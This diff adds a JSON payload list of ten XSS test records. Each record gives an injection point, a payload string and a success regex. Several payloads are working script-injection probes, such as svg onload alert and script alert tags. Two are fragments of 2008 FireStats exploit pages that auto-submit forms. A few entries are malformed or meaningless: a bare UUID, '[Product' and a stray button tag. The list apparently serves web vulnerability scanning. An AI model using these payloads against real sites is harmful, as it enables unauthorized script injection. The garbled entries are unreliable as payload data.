@@ -1,0 +1,112 @@
+[
+  {
+    "payload_id": "OWP-57519",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "28f8e754-fb05-4f5e-adda-79e252fe2c30",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-57639",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "<svg onload=alert(\"OpenRemoteJSON\")>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-61604",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "<script>alert(\"XSS1\")</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-61605",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "<svg onload=alert(\"XSS2\")>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-61606",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "<svg onload=prompt(\"XSS4\")>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-63065",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "[Product",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-63067",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "<script>alert(&#039;XSS 1&#039;);</script>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-64584",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "<html> <head> <title>FireStats XSS exploit (C) 2008 MustLive. http://websecurity.com.ua</title> </head> <!-- <body onLoad=\"document.hack.submit()\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-64585",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "PHP",
+    "injection_point": "body_json",
+    "payload_string": "<html> <head> <title>FireStats Insuficient Anti-automation exploit (C) 2008 MustLive. http://websecurity.com.ua</title> </head> <!-- <body onLoad=\"document.hack.submit()\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  },
+  {
+    "payload_id": "OWP-65247",
+    "vulnerability_category": "Injection (XSS)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "<button id=\"upload\" onclick=\"start()\" type=\"button\">",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "<script>alert|prompt|confirm"
+    }
+  }
+]
